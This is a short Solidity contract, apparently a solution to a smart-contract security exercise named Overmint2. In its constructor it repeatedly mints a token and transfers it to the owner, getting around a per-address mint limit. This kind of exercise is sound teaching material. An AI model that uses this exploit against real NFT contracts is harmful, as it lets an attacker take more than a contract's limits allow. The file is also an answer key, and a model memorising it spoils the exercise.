// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "../Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 public immutable target;
    address internal immutable owner;

    constructor(address _target, address _owner) {
        target = Overmint2(_target);
        owner = _owner;
        target.mint();
        target.transferFrom(address(this), owner, 1);
        target.mint();
        target.transferFrom(address(this), owner, 2);
        target.mint();
        target.transferFrom(address(this), owner, 3);
        target.mint();
        target.transferFrom(address(this), owner, 4);
        target.mint();
        target.transferFrom(address(this), owner, 5);
    }
}
